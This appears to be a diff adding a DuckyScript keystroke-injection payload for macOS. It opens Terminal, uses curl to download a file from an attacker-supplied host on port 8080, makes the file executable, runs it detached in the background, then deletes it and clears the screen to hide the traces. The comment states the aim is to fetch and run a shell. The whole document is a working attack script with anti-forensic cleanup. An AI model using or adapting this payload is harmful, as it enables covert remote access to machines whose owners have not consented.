@@ -1,0 +1,28 @@
+REM Script to fetch shell and run
+
+DEFAULT_DELAY 200
+
+REM Bypass MacOS Keyboard Setup
+DELAY 3000
+F4
+DELAY 2500
+STRING Terminal
+DELAY 2500
+ENTER
+DELAY 1500
+
+REM Fetch File
+STRING curl -o /tmp/top http://
+WAIT_FOR_BUTTON_PRESS
+STRINGLN :8080/mac
+
+REM Run file
+STRINGLN chmod +x /tmp/top
+STRINGLN /tmp/top &
+STRINGLN disown
+
+REM Cleanup
+STRINGLN clear
+DELAY 500
+STRINGLN rm -f /tmp/top
+STRINGLN clear
